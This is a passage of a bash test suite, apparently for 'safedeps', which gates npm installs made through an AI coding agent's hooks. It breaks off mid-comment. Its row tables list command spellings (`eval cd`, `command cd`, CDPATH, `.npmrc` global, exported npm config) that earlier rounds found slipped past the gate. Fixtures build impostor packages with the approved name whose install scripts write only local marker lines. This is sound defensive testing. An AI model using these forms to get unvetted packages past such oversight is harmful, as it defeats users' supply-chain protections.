#!/usr/bin/env bash
# safedeps: an npm install counts as read only where it left a trace.
#
# The effect gate reads one directory per command, and the pre-guard picks it
# from the command text before the command runs. Three validation rounds found
# text that picked the wrong one: a `cd` that never ran (`false && cd sub;`), a
# `cd` spelled another way (`command cd sub`), a symlinked workspace member.
# Each time the gate read a directory the install never touched, confirmed it
# clean, and passed the install unread. The design judgment for
# safedeps/effect-gate-blind-to-lockless-npm-installs measured 21 such silent
# rows on fe160c1 and moved the authority: the text picks where to look, and
# the PostToolUse hook records the install UNGATED when that directory shows no
# trace of this command. A rule for commands with several lockfile-writing npm
# statements closes the case where one statement's trace hides another's.
#
# Every row runs the real sequence an agent's Bash call goes through, against a
# real npm and the local registry of scripts/test/lib/npm-sandbox.sh: PreToolUse,
# the command as PreToolUse left it, PostToolUse. The rows are the judgment's
# grid plus an inherited CDPATH (X1). Each row is judged on what happened on
# disk, not on what the hooks said about it:
#
#   - silent: sd-victim is on disk (in the project, the sandbox global prefix,
#     or the alternate tree) after the command, the post hook did not roll it
#     back, and nothing recorded UNGATED. This is the defect class. The battery
#     prints every row and fails at the end, so a run against an older tree
#     counts its silent rows instead of stopping at the first.
#   - expect: what the row must do here. `rollback`, `ungated` (with the
#     wording the record must carry), or `quiet` for an approved install.
#
# GRID_REPORT_ONLY=1 prints the rows and exits 0 whatever they say. It exists
# for the control run against a tree from before the repair, where the count is
# the result; `npm test` never sets it.
set -euo pipefail

ROOT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)
cd "${ROOT_DIR}"

pass() { printf 'ok - %s\n' "$1"; }
fail() { printf 'not ok - %s\n' "$1" >&2; exit 1; }
# Rows for --shard I/M (scripts/test/lib/shard.sh): each row of a table below,
# each pass of a loop over carriers, and each case that stands alone (LK1,
# VB4, the same-second trials, the backstop pair). A row makes its own project
# and safedeps home. The sandbox's npm cache is shared, as it is unsharded:
# a row that needs a cold cache empties it itself.
# shellcheck source=lib/shard.sh
source "${ROOT_DIR}/scripts/test/lib/shard.sh"
shard_args "$@"
(( ${#SHARD_REST[@]} == 0 )) || fail "effect-trace-grid.sh takes --shard I/M or --shard-list, not ${SHARD_REST[0]}"
# Whether this run ran an RH row, the rows the evil registry is there for.
rh_rows_ran=false

NPM_SANDBOX_NAME=trace-grid
NPM_SANDBOX_SCRIPT_RE='effect-trace-grid\.sh'
NPM_SANDBOX_TOLERANT=true
# shellcheck source=lib/npm-sandbox.sh
source "${ROOT_DIR}/scripts/test/lib/npm-sandbox.sh"
# Forms hold paths under the sandbox, so a row's label says <tmp> there.
shard_mask tmp "${tmp_root}"

# An alternate tree for CDPATH: <alt>/sub is a project of its own, so a `cd sub`
# that CDPATH sends there installs there.
ALT="${tmp_root}/alt"
mkdir -p "${ALT}/sub"
printf '{"name":"alt-sub","version":"1.0.0"}\n' > "${ALT}/sub/package.json"

REPORT_ONLY="${GRID_REPORT_ONLY:-0}"
FAILURES=()
SILENT_ROWS=()

note_failure() { FAILURES+=("$1"); printf '   FAIL %s\n' "$1"; }

# Where sd-victim is on disk after a row: the project tree, the sandbox global
# prefix, the alternate tree.
victim_on_disk() {
  {
    (cd "${CASE_PROJECT}" && find . -path '*/node_modules/sd-victim' -print 2>/dev/null)
    find "${tmp_root}/global" -path '*/node_modules/sd-victim' -print 2>/dev/null | sed "s#^${tmp_root}/#<sandbox>/#"
    find "${ALT}" -path '*/node_modules/sd-victim' -print 2>/dev/null | sed "s#^${tmp_root}/#<sandbox>/#"
  } | paste -sd, -
}

# Clears what one row leaves behind outside the project: the global prefix is
# cleared by run_install, the alternate tree here, its manifest included (an
# install there saves the package to it, and the next row would install it).
reset_alt() {
  rm -rf "${ALT}/sub/node_modules" "${ALT}/sub/package-lock.json"
  printf '{"name":"alt-sub","version":"1.0.0"}\n' > "${ALT}/sub/package.json"
}

# The same fixtures under a directory named like a UUID. npm 11.19.0 masks anything
# shaped like one in what it prints, the directory it names for an install
# included, so the pre-guard has to read npm's answer through the mask
# (lib/npm/ask.sh). An agent's scratch directory is often under a session UUID.
UUID_DIR="${tmp_root}/3f944c98-33ca-4b92-9f2e-aab54047d1d6"
UUID_OTHER="${tmp_root}/aab54047-33ca-4b92-9f2e-3f944c98aab5"
mkdir -p "${UUID_DIR}" "${UUID_OTHER}"
new_uuidproject() { CASE_PARENT="${UUID_DIR}"; new_project; CASE_PARENT=""; }
new_uuidworkspace() { CASE_PARENT="${UUID_DIR}"; new_workspace; CASE_PARENT=""; }

post_ungated_lines() { grep 'post-verify UNGATED' "${CASE_HOME}/advisory.log" 2>/dev/null || true; }
# What an install that left no trace is recorded as: the check that found none.
NO_TRACE_CHECK='neither npm lockfile there is newer than the baseline taken before this command or has another inode'
# The lines of the post hook's message, for a check of one whole line.
post_message_lines() { jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null; }

# One row. <id>|<fixture>|<cwd>|<engine>|<expect>|<command>
# <expect>: rollback | ungated-trace | ungated-attrib | quiet, or read: rolled
# back where the gate looked, or recorded as having left no trace there
# The command may say @ALT@ for the alternate tree; @ENVCDPATH@ as its first
# word runs it with CDPATH=<alt> inherited from the environment, which the
# hooks do not see.
run_row() {
  local row="$1" id fixture cwd engine expect form victim scripts silent=false status rb ug
  IFS='|' read -r id fixture cwd engine expect form <<< "${row}"
  form="${form//@ALT@/${ALT}}"
  CASE_CMD_ENV=()
  if [[ "${form}" == "@ENVCDPATH@ "* ]]; then
    form="${form#"@ENVCDPATH@ "}"
    CASE_CMD_ENV=("CDPATH=${ALT}")
  fi
  "new_${fixture}"
  CASE_CWD="${CASE_PROJECT}/${cwd}"
  reset_alt
  : > "${MARKS}"
  run_install "${form}" "${engine}"
  CASE_CMD_ENV=()

  victim=$(victim_on_disk)
  scripts=$(grep -c '^sd-victim' "${MARKS}" || true)
  rb=no; rolled_back && rb=yes
  ug=no; ungated && ug=yes
  if [[ -n "${victim}" && "${rb}" == no && "${ug}" == no ]]; then
    silent=true
    SILENT_ROWS+=("${id}(${engine})")
  fi
  status="rollback=${rb} ungated=${ug} victim=[${victim}] victim_scripts=${scripts} rc=${CASE_INSTALL_RC}"
  printf '%-4s %-7s %s | %s%s\n' "${id}" "${engine}" "${form}" "${status}" "$([[ "${silent}" == true ]] && printf ' SILENT')"

  [[ -z "${CASE_PRE_DENY}" ]] || { note_failure "${id}: the gate lets the command through (deny: ${CASE_PRE_DENY:0:160})"; return 0; }
  [[ "${silent}" == false ]] || note_failure "${id}: sd-victim is on disk, not rolled back and not recorded"
  if [[ "${engine}" == claude ]]; then
    [[ "${CASE_NOT_INERT}" == false ]] || note_failure "${id}: the install runs inert on Claude Code"
    [[ "${scripts}" == 0 ]] || note_failure "${id}: no script of sd-victim runs on Claude Code (${scripts})"
  fi
  case "${expect}" in
    rollback)
      [[ "${rb}" == yes ]] || note_failure "${id}: rolled back (post: ${CASE_POST:-<quiet>})"
      [[ -z "${victim}" ]] || note_failure "${id}: the rollback removes sd-victim from disk (${victim})"
      ;;
    ungated-trace)
      # The record says the check that found no trace, and does not guess where
      # the install went or whether it installed anything. Section 1b checks
      # the directory it names.
      post_ungated_lines | grep -qF "post-verify UNGATED: no install trace in " \
        || note_failure "${id}: recorded UNGATED as an install with no trace ($(post_ungated_lines | cut -f2 | head -c 200))"
      post_ungated_lines | grep -qF "${NO_TRACE_CHECK}" \
        || note_failure "${id}: the record says which check found no trace"
      [[ "${engine}" == codex ]] || ! grep -q '^sd-' <<< "${CASE_RAN}" \
        || note_failure "${id}: nothing is rebuilt where the install left no trace (${CASE_RAN})"
      ;;
    read)
      if [[ "${rb}" == yes ]]; then
        [[ -z "${victim}" ]] || note_failure "${id}: the rollback removes sd-victim from disk (${victim})"
      else
        post_ungated_lines | grep -qF "${NO_TRACE_CHECK}" \
          || note_failure "${id}: rolled back, or recorded UNGATED as an install with no trace (post: ${CASE_POST:-<quiet>})"
      fi
      ;;
    ungated-attrib)
      post_ungated_lines | grep -qF 'cannot answer for every npm install in this command' \
        || note_failure "${id}: recorded UNGATED because one trace cannot answer for every npm install ($(post_ungated_lines | cut -f2 | head -c 200))"
      ;;
    quiet)
      [[ -z "${CASE_POST}" ]] || note_failure "${id}: an approved install is confirmed quietly (post: ${CASE_POST})"
      ungated && note_failure "${id}: an install that left its trace is not recorded UNGATED ($(grep UNGATED "${CASE_HOME}/advisory.log" | cut -f2 | head -c 200))"
      grep -q '^sd-approved@[^	]*	install' <<< "${CASE_RAN}" \
        || note_failure "${id}: the verified inert install is rebuilt, so its scripts run (${CASE_RAN:-nothing ran})"
      ;;
    *) fail "unknown expectation ${expect} in row ${id}" ;;
  esac
  return 0
}

# --- 1. The grid -----------------------------------------------------------------------
# `sub` has a package.json of its own, `src` does not. Rows C/R2/F1 are the
# forms of rounds 1 and 2; G1/G2 of round 3; N, M, X were added by the design
# judgment. The expectation column is what the repaired gate does; the comment
# after a group says why.
printf '# grid (id engine command | outcome)\n'
while IFS= read -r row; do
  [[ -n "${row}" && "${row}" != \#* ]] || continue
  shard_row "grid: ${row}" || continue
  run_row "${row}"
done <<'ROWS'
C1|project|.|claude|rollback|npm install sd-victim
C2|project|.|claude|rollback|cd sub && npm install sd-victim
C3|project|.|claude|rollback|cd sub; npm install sd-victim
C4|project|.|claude|quiet|cd sub && npm install sd-approved
R2a|project|.|claude|rollback|cd src && npm install sd-victim
R2b|project|.|claude|rollback|cd src; npm install sd-victim --no-save
R2c|workspace|.|claude|rollback|cd packages/a && npm install sd-victim
F1a|symws|real/a|claude|rollback|npm install sd-victim
F1b|symws|.|claude|rollback|cd packages/a && npm install sd-victim
F1c|symws|.|claude|rollback|cd real/a && npm install sd-victim
F1d|symws|packages/a|claude|rollback|npm install sd-victim --no-save
F1e|symws|real/a|codex|rollback|npm install sd-victim
# A `cd` that may not run is not followed past the `&&` chain after it, so the
# gate reads the cwd, where npm installed (round 3, G1).
G1a|project|.|claude|rollback|false && cd sub; npm install sd-victim
G1b|project|.|claude|rollback|true || cd sub; npm install sd-victim
G1c|project|.|claude|rollback|if false; then cd sub; fi; npm install sd-victim
G1d|project|.|codex|rollback|false && cd sub; npm install sd-victim
# Spellings of `cd` the text does not follow. npm installs in sub, the gate
# reads the cwd and finds no trace there.
G2a|project|.|claude|ungated-trace|command cd sub; npm install sd-victim
G2b|project|.|claude|ungated-trace|builtin cd sub; npm install sd-victim
G2c|project|.|claude|ungated-trace|FOO=1 cd sub; npm install sd-victim
G2d|project|.|claude|ungated-trace|eval cd sub; npm install sd-victim
G2e|project|.|claude|ungated-trace|case x in x) cd sub;; esac; npm install sd-victim
G2f|project|.|codex|ungated-trace|command cd sub; npm install sd-victim
N1|project|.|claude|rollback|cd sub || exit 1; npm install sd-victim
# A conditional `cd` that does run: the text cannot tell it from G1, so the
# gate reads the cwd and records what it did not find.
N2|project|.|claude|ungated-trace|[ -d sub ] && cd sub; npm install sd-victim
N3|project|.|claude|rollback|true && cd sub && npm install sd-victim
N4|project|.|claude|rollback|cd sub 2>/dev/null; npm install sd-victim
N5|project|.|claude|ungated-trace|(cd sub && npm install sd-victim)
N6|project|.|claude|rollback|(cd sub); npm install sd-victim
N7|project|.|claude|ungated-trace|f() { cd sub; }; f; npm install sd-victim
N8|project|.|claude|ungated-trace|printf 'cd sub\n' > go.sh; . ./go.sh; npm install sd-victim
N9|project|.|claude|rollback|pushd sub >/dev/null; npm install sd-victim
N10|project|.|claude|rollback|cd sub; cd -; npm install sd-victim
N11|project|.|claude|ungated-trace|cd "$(pwd)/sub" && npm install sd-victim
N12|project|.|claude|rollback|cd nonexist; npm install sd-victim
N13|project|.|claude|ungated-trace|CDPATH=@ALT@; cd sub; npm install sd-victim
X1|project|.|claude|ungated-trace|@ENVCDPATH@ cd sub; npm install sd-victim
# The command changes what npm's answer depends on: a package.json, an .npmrc,
# the workspace declaration. N14 and N15 were recorded UNGATED before the
# release tree was merged in and rolled back after it (measured; the cause was
# not traced); either is the gate answering for the install.
N14|project|src|claude|read|npm init -y >/dev/null && npm install sd-victim
N15|project|.|claude|read|cd src && npm init -y >/dev/null && npm install sd-victim
N16|project|.|claude|ungated-trace|cd sub && rm -f package.json && npm install sd-victim
N17|project|.|claude|ungated-trace|printf 'global=true\n' > .npmrc && npm install sd-victim
N18|project|.|claude|ungated-trace|mkdir -p newp && cd newp && npm init -y >/dev/null && npm install sd-victim
N19|workspace|.|claude|ungated-trace|printf '{"name":"root","version":"1.0.0","private":true}\n' > package.json && cd packages/a && npm install sd-victim
N20|project|.|claude|ungated-trace|npm_config_global=true; export npm_config_global; npm install sd-victim
N21|project|.|claude|ungated-trace|declare -x npm_config_global=true; npm install sd-victim
N22|project|.|claude|ungated-trace|printf 'export npm_config_global=true\n' > e.sh; . ./e.sh; npm install sd-victim
# Two lockfile writers with something between them: the first one's trace
# would answer for both.
M1|project|.|claude|ungated-attrib|npm install sd-approved; command cd sub; npm install sd-victim
M2|project|src|claude|ungated-attrib|npm install sd-approved && npm init -y >/dev/null && npm install sd-victim
M3|project|.|claude|ungated-attrib|cd sub && npm install sd-approved; cd ..; npm install sd-victim
M4|project|src|claude|ungated-attrib|npm prune; npm init -y >/dev/null; npm install sd-victim
M5|project|.|claude|ungated-attrib|npm install sd-approved && npm -C sub install sd-victim
M6|project|.|claude|ungated-attrib|npm install sd-approved; sh -c 'cd sub && npm install sd-victim'
# Nothing installed: a dry run, a package the registry does not have.
E1|project|.|claude|ungated-trace|npm install --dry-run sd-victim
E2|project|.|claude|ungated-trace|npm install sd-nope
# An inherited CDPATH sends an approved install elsewhere: recorded, not
# rebuilt here.
X2|project|.|claude|ungated-trace|@ENVCDPATH@ cd sub && npm install sd-approved
# A bare install with no name, sent elsewhere: recorded whatever it names.
X3|project|.|claude|ungated-trace|printf '{"name":"sub","version":"1.0.0","dependencies":{"sd-victim":"1.0.0"}}' > sub/package.json; command cd sub; npm install
# Under a directory npm masks in its answers: the same installs, read where
# npm put them. Before the mask was read, every one of these was denied or read
# in a directory that does not exist.
U1|uuidproject|.|claude|quiet|npm install sd-approved
U2|uuidproject|src|claude|quiet|npm install sd-approved
U3|uuidproject|.|claude|quiet|cd sub && npm install sd-approved
U4|uuidproject|.|claude|rollback|npm install sd-victim
U5|uuidproject|src|claude|rollback|npm install sd-victim
U6|uuidproject|.|codex|rollback|cd sub && npm install sd-victim
U7|uuidworkspace|packages/a|claude|quiet|npm install sd-approved
U8|uuidworkspace|packages/a|claude|rollback|npm install sd-victim
ROWS
claude_silent=0
for row in "${SILENT_ROWS[@]+"${SILENT_ROWS[@]}"}"; do
  [[ "${row}" != *"(claude)" ]] || claude_silent=$(( claude_silent + 1 ))
done
printf '# silent rows: %s, Claude %s (%s)\n' "${#SILENT_ROWS[@]}" "${claude_silent}" "${SILENT_ROWS[*]:-none}"

# --- 1a. What an install brought in is read from the record it wrote -------------------
# The rows above ask whether an install was read. These ask whether every check
# read it. The closure check reads both npm records, but the source check and
# the install-script heuristics ran only when package-lock.json or package.json
# changed, and an install that saves nothing changes neither. So a tarball with
# the approved name and version, fetched from a file or an http URL, passed
# both, and the rebuild ran its scripts; so did an approved package whose
# install script the heuristics flag when it is saved (validator round 4: C1,
# C3, C5, C6, H2). The saved forms (C2, C4, H1) were rolled back all along and
# are the controls.
#
# Both checks now read what the install's records hold that no record held
# before the command (collect_npm_new_records). A committed lockfile is one of
# those earlier records, so a fresh clone's `npm ci` installs the sources it
# names, a tarball among them, as recorded. That is a boundary, and the K rows
# pin it from the side of the projects it protects: no rollback. The rebuild
# after it is a different question, asked of the whole tree (section 1d), so
# a committed tarball is installed and not rebuilt (K2, K3).
#
# What the records hold is read entry by entry, and each kind left out or read
# is a row: a directory dependency's link and target (A1-A4, rolled back as
# they were before the records were read), a workspace pattern that leaves the
# project (A5), a workspace member, which is part of the project (W1, W2), a
# member list the gate cannot read in full, which counts no member (W3), and
# the project's own entry (X0). A source is on the public registry only when
# its value starts with that registry's https URL, not when it merely names it
# (B1-B3).
#
# EVIL-sd-approved is a tarball named sd-approved@1.0.0, the approved name and
# version, whose scripts write EVIL lines. sd-fetchy@1.0.0 is approved, and its
# postinstall names `fetch`, which the heuristics read as network access.
EVIL_DIR="${tmp_root}/evil"
mkdir -p "${EVIL_DIR}/src"
cat > "${EVIL_DIR}/src/mark.js" <<EOF
require('fs').appendFileSync('${MARKS}', 'EVIL-sd-approved@1.0.0\t' + process.argv[2] + '\t' + process.cwd() + '\n');
EOF
jq -n '{name: "sd-approved", version: "1.0.0",
  scripts: {preinstall: "node mark.js preinstall", install: "node mark.js install", postinstall: "node mark.js postinstall"}}' \
  > "${EVIL_DIR}/src/package.json"
(cd "${EVIL_DIR}/src" && npm pack --pack-destination "${EVIL_DIR}" >/dev/null 2>&1) || fail "npm pack builds the impostor sd-approved"
# Served under another name, so an http URL can fetch it from the fixture registry.
cp "${EVIL_DIR}/sd-approved-1.0.0.tgz" "${tmp_root}/tarballs/sd-evilsrc-1.0.0.tgz"
cp "${EVIL_DIR}/src/package.json" "${tmp_root}/tarballs/sd-evilsrc-1.0.0.tgz.json"
EVIL_URL="http://127.0.0.1:$(cat "${tmp_root}/registry.port")/sd-evilsrc/-/sd-evilsrc-1.0.0.tgz"

mkdir -p "${tmp_root}/src/sd-fetchy-1.0.0"
cat > "${tmp_root}/src/sd-fetchy-1.0.0/mark.js" <<EOF
require('fs').appendFileSync('${MARKS}', 'sd-fetchy@1.0.0\t' + process.argv[2] + '\t' + process.cwd() + '\n');
EOF
jq -n '{name: "sd-fetchy", version: "1.0.0", scripts: {postinstall: "node mark.js postinstall # fetch"}}' \
  > "${tmp_root}/src/sd-fetchy-1.0.0/package.json"
(cd "${tmp_root}/src/sd-fetchy-1.0.0" && npm pack --pack-destination "${tmp_root}/tarballs" >/dev/null 2>&1) \
  || fail "npm pack builds sd-fetchy"
cp "${tmp_root}/src/sd-fetchy-1.0.0/package.json" "${tmp_root}/tarballs/sd-fetchy-1.0.0.tgz.json"

# <dependency> into package.json, as a project that declares it would have it,
# without installing it.
declare_dependency() {
  jq --arg name "$1" --arg spec "$2" '.dependencies[$name] = $spec' "${CASE_PROJECT}/package.json" > "${CASE_PROJECT}/package.json.new"
  mv "${CASE_PROJECT}/package.json.new" "${CASE_PROJECT}/package.json"
}
vendor() { mkdir -p "${CASE_PROJECT}/vendor"; cp "$1" "${CASE_PROJECT}/vendor/"; }
# The fixtures. `clone*` are a project as a repository holds it: a committed
# lockfile and no node_modules. `pulled` has an installed tree and a lockfile
# that has moved on from it, as after a pull that added a dependency.
new_filedep() { new_project; vendor "${EVIL_DIR}/sd-approved-1.0.0.tgz"; declare_dependency sd-approved file:vendor/sd-approved-1.0.0.tgz; }
new_httpdep() { new_project; declare_dependency sd-approved "${EVIL_URL}"; }
new_vendored() { new_project; vendor "${EVIL_DIR}/sd-approved-1.0.0.tgz"; }
new_fetchy() {
  new_project
  ( export SAFEDEPS_HOME="${CASE_HOME}"
    . lib/ledger/ledger.sh
    safedeps_ledger_write_approved_spec npm sd-fetchy 1.0.0 >/dev/null ) || fail "the fixture approves sd-fetchy"
}
new_clone() {
  new_project
  declare_dependency sd-approved 1.0.0
  (cd "${CASE_PROJECT}" && npm install --ignore-scripts >/dev/null 2>&1 && rm -rf node_modules) || fail "the fixture clone is made"
}
new_clonetarball() {
  new_project
  vendor "${tmp_root}/tarballs/sd-approved-1.0.0.tgz"
  declare_dependency sd-approved file:vendor/sd-approved-1.0.0.tgz
  (cd "${CASE_PROJECT}" && npm install --ignore-scripts >/dev/null 2>&1 && rm -rf node_modules) || fail "the fixture clone with a tarball dependency is made"
}
new_pulled() {
  new_project
  (cd "${CASE_PROJECT}" && npm install sd-approved@1.0.0 --ignore-scripts >/dev/null 2>&1) || fail "the fixture installs sd-approved"
  vendor "${tmp_root}/tarballs/sd-swapped-1.0.0.tgz"
  declare_dependency sd-swapped file:vendor/sd-swapped-1.0.0.tgz
  (cd "${CASE_PROJECT}" && npm install --package-lock-only --ignore-scripts >/dev/null 2>&1) || fail "the fixture lockfile moves on from the tree"
  [[ ! -e "${CASE_PROJECT}/node_modules/sd-swapped" ]] || fail "the pulled fixture leaves the tree as it was"
}

# Directory dependencies. npm records one as a link and its target, keyed by
# the directory (`node_modules/evildir {resolved: "../evildir", link: true}` and
# `../evildir {version}`), in both records, saved or not, and `npm rebuild` runs
# the target's install scripts through the link. Reading neither entry let the
# rebuild run them (validator round 5: A1-A4); the lockfile diff that came
# before rolled the saved forms back. evildir and local/inner are packages
# whose scripts write EVIL lines.

# <dir>: a package named <name> whose three install scripts write <mark> lines.
make_dir_package() {
  mkdir -p "$1"
  cat > "$1/mark.js" <<EOF
require('fs').appendFileSync('${MARKS}', '$3\t' + process.argv[2] + '\t' + process.cwd() + '\n');
EOF
  jq -n --arg name "$2" '{name: $name, version: "1.0.0",
    scripts: {preinstall: "node mark.js preinstall", install: "node mark.js install", postinstall: "node mark.js postinstall"}}' \
    > "$1/package.json"
}
make_evil_dir() { make_dir_package "$1" "$2" "EVIL-$2"; }
# A workspace member's scripts are the project's own, and run in the rebuild.
make_member_dir() { make_dir_package "$1" "$2" "$2@1.0.0"; }
new_linked() {
  new_project
  (cd "${CASE_PROJECT}" && npm install sd-approved@1.0.0 --ignore-scripts >/dev/null 2>&1) || fail "the fixture installs sd-approved"
  rm -rf "${CASE_PROJECT}/../evildir"
  make_evil_dir "${CASE_PROJECT}/../evildir" evildir
  make_evil_dir "${CASE_PROJECT}/local/inner" inner
}
new_linkdep() { new_linked; declare_dependency evildir file:../evildir; }
# A workspace whose patterns reach out of the project: npm links ../evildir as a
# member, and the gate does not count a directory outside the project as one.
new_wsout() {
  new_workspace
  rm -rf "${CASE_PROJECT}/../evildir"
  make_evil_dir "${CASE_PROJECT}/../evildir" evildir
  jq '.workspaces += ["../evildir"]' "${CASE_PROJECT}/package.json" > "${CASE_PROJECT}/package.json.new"
  mv "${CASE_PROJECT}/package.json.new" "${CASE_PROJECT}/package.json"
}
# A workspace gaining a member: packages/b, and the same member reached
# through a symlink (packages/b -> ../real/b) in wsadd_linked. That one is not
# rolled back either, but its rebuild is skipped with a warning: npm records
# the member as packages/b and `npm query` answers real/b, so the rebuild
# precondition finds the member unrecorded (measured, npm 10.8.2; the same
# before this change). W2 pins both: no rollback, and that warning.
new_wsadd() { new_workspace; make_member_dir "${CASE_PROJECT}/packages/b" sd-member; }
new_wsadd_linked() {
  new_workspace
  make_member_dir "${CASE_PROJECT}/real/b" sd-member
  ln -s ../real/b "${CASE_PROJECT}/packages/b"
}
# A workspace that negates a pattern, which the gate does not read, gaining a
# member: no directory there counts as a member, so the new link is rolled back
# and advisory.log says why (W3). A member list read past the negation would be
# longer than npm's.
new_wsneg_add() { new_negws; make_member_dir "${CASE_PROJECT}/packages/c" sd-member; }
# A project that has never installed anything, whose own postinstall says
# `fetch`. With no earlier record, all of its first install is new, and the
# project's own entry is not part of that.
new_rootscript() {
  CASE_PROJECT=$(mktemp -d "${tmp_root}/project.XXXXXX")
  CASE_PROJECT=$(cd "${CASE_PROJECT}" && pwd -P)
  CASE_CWD="${CASE_PROJECT}"
  jq -n '{name: "proj", version: "1.0.0", scripts: {postinstall: "node -e 0 # fetch"}}' > "${CASE_PROJECT}/package.json"
  new_safedeps_home
}
# The impostor sd-approved under a directory named registry.npmjs.org. The
# source `file:registry.npmjs.org/sd-approved-1.0.0.tgz` contains the public
# registry's name, which a substring test read as the registry (B1-B3).
new_regdir() { new_project; mkdir -p "${CASE_PROJECT}/registry.npmjs.org"; cp "${EVIL_DIR}/sd-approved-1.0.0.tgz" "${CASE_PROJECT}/registry.npmjs.org/"; }
new_regdep() { new_regdir; declare_dependency sd-approved file:registry.npmjs.org/sd-approved-1.0.0.tgz; }

# <id>|<fixture>|<engine>|<expect>|<command>, where <expect> is `quiet:<package>`
# (confirmed quietly and <package> rebuilt), `rollback:<reason>` (rolled back
# with a reason that says <reason>, and on Claude Code no script of the
# impostor or of sd-fetchy ran at all; the rollback itself runs no npm),
# or `kept:<warning>` (not rolled back, with a warning that says <warning>).
printf '# what an install brought in (id engine command | outcome)\n'
failures_before=${#FAILURES[@]}
while IFS= read -r row; do
  [[ -n "${row}" && "${row}" != \#* ]] || continue
  shard_row "records: ${row}" || continue
  IFS='|' read -r id fixture engine expect form <<< "${row}"
  FIRST_PROJECT=""
  "new_${fixture}"
  expect="${expect//@FIRST@/${FIRST_PROJECT}}"
  : > "${MARKS}"
  run_install "${form}" "${engine}"
  reason=$(jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null | sed -n '/^Detected problems:/,/^Rollback snapshot:/p' | sed '1d;$d' | paste -sd' ' -)
  printf '%-4s %-7s %s | rollback=%s ungated=%s ran=[%s] reason=[%s]\n' "${id}" "${engine}" "${form}" \
    "$(rolled_back && echo yes || echo no)" "$(ungated && echo yes || echo no)" \
    "$(cut -f1,2 "${MARKS}" | tr '\t' ':' | paste -sd, -)" "${reason:0:200}"
  [[ -z "${CASE_PRE_DENY}" ]] || { note_failure "${id}: the gate lets the command through (deny: ${CASE_PRE_DENY:0:160})"; continue; }
  [[ "${CASE_INSTALL_RC}" == 0 ]] || { note_failure "${id}: the install itself succeeds (rc ${CASE_INSTALL_RC})"; continue; }
  ungated && note_failure "${id}: an install that left its trace is not recorded UNGATED ($(post_ungated_lines | cut -f2 | head -c 200))"
  case "${expect}" in
    quiet:*)
      [[ -z "${CASE_POST}" ]] || note_failure "${id}: confirmed quietly (post: ${CASE_POST:0:300})"
      grep -q "^${expect#quiet:}@[^	]*	install" <<< "${CASE_RAN}" \
        || note_failure "${id}: the verified install is rebuilt, so ${expect#quiet:}'s scripts run (${CASE_RAN:-nothing ran})"
      ;;
    kept:*)
      ! rolled_back || note_failure "${id}: not rolled back (post: ${CASE_POST:0:300})"
      grep -qF "${expect#kept:}" <<< "${CASE_POST}" || note_failure "${id}: the warning says ${expect#kept:} (post: ${CASE_POST:-<quiet>})"
      [[ "${engine}" != claude || -z "${CASE_RAN}" ]] || note_failure "${id}: the skipped rebuild runs no script (${CASE_RAN})"
      ;;
    rollback:*)
      rolled_back || note_failure "${id}: rolled back (post: ${CASE_POST:-<quiet>})"
      grep -qF "${expect#rollback:}" <<< "${CASE_POST}" || note_failure "${id}: the reason says ${expect#rollback:} (${reason:-none})"
      if [[ "${engine}" == claude ]]; then
        ! grep -q '^EVIL-' "${MARKS}" || note_failure "${id}: no script of the impostor runs ($(grep -c '^EVIL-' "${MARKS}"))"
        ! grep -q '^sd-fetchy' "${MARKS}" || note_failure "${id}: the flagged install script does not run ($(grep -c '^sd-fetchy' "${MARKS}"))"
      fi
      ;;
    *) fail "unknown expectation ${expect} in row ${id}" ;;
  esac
done <<ROWS
C0|project|claude|quiet:sd-approved|npm install sd-approved@1.0.0
C1|filedep|claude|rollback:non-standard registries (node_modules/.package-lock.json: file:vendor/sd-approved-1.0.0.tgz)|npm install --no-save
C2|filedep|claude|rollback:non-standard registries|npm install
C3|httpdep|claude|rollback:insecure (non-HTTPS) resolved URLs (node_modules/.package-lock.json: ${EVIL_URL})|npm install --no-save
C4|httpdep|claude|rollback:non-standard registries|npm install
C5|vendored|claude|rollback:non-standard registries (node_modules/.package-lock.json: file:vendor/sd-approved-1.0.0.tgz)|npm install --no-save ./vendor/sd-approved-1.0.0.tgz
C5x|vendored|codex|rollback:non-standard registries|npm install --no-save ./vendor/sd-approved-1.0.0.tgz
C6|httpdep|claude|rollback:non-standard registries (node_modules/.package-lock.json: ${EVIL_URL})|npm_config_save=false npm install
H1|fetchy|claude|rollback:Package 'sd-fetchy' has install script with network access|npm install sd-fetchy@1.0.0
H2|fetchy|claude|rollback:Package 'sd-fetchy' has install script with network access|npm install --no-save sd-fetchy@1.0.0
K1|clone|claude|quiet:sd-approved|npm ci
K2|clonetarball|claude|kept:holds a package not recorded as coming from the public registry (node_modules/sd-approved (sd-approved@1.0.0 from file:vendor/sd-approved-1.0.0.tgz))|npm ci
K3|pulled|claude|kept:holds a package not recorded as coming from the public registry (node_modules/sd-swapped (sd-swapped@1.0.0 from file:vendor/sd-swapped-1.0.0.tgz))|npm ci
A1|linked|claude|rollback:non-standard registries (package-lock.json: ../evildir|npm install ../evildir
A2|linked|claude|rollback:non-standard registries (node_modules/.package-lock.json: ../evildir)|npm install --no-save ../evildir
A3|linkdep|claude|rollback:non-standard registries (package-lock.json: ../evildir|npm install
A4|linked|claude|rollback:non-standard registries (package-lock.json: local/inner|npm install ./local/inner
A5|wsout|claude|rollback:non-standard registries (package-lock.json: ../evildir|npm install
W1|wsadd|claude|quiet:sd-member|npm install
W2|wsadd_linked|claude|kept:holds a package, or a version of one, that neither lockfile records (real/b (sd-member@1.0.0|npm install
W3|wsneg_add|claude|rollback:non-standard registries (package-lock.json: packages/c|npm install
X0|rootscript|claude|quiet:sd-approved|npm install sd-approved@1.0.0
B1|regdir|claude|rollback:non-standard registries (node_modules/.package-lock.json: file:registry.npmjs.org/sd-approved-1.0.0.tgz)|npm install --no-save ./registry.npmjs.org/sd-approved-1.0.0.tgz
B2|regdir|claude|rollback:non-standard registries (package-lock.json: file:registry.npmjs.org/sd-approved-1.0.0.tgz|npm install ./registry.npmjs.org/sd-approved-1.0.0.tgz
B3|regdep|claude|rollback:non-standard registries (node_modules/.package-lock.json: file:registry.npmjs.org/sd-approved-1.0.0.tgz)|npm_config_save=false npm install
ROWS
[[ ${#FAILURES[@]} -ne ${failures_before} ]] \
  || pass "installs that save nothing have their sources and install scripts checked like saved ones, a directory dependency and a source that only names the registry are rolled back, a workspace member is not, and a committed lockfile installs as recorded"

# --- 1d. Install scripts run only over a tree the gate can vouch for, whole ---------------
# Install scripts ran in two places, and both ran over the whole tree: the
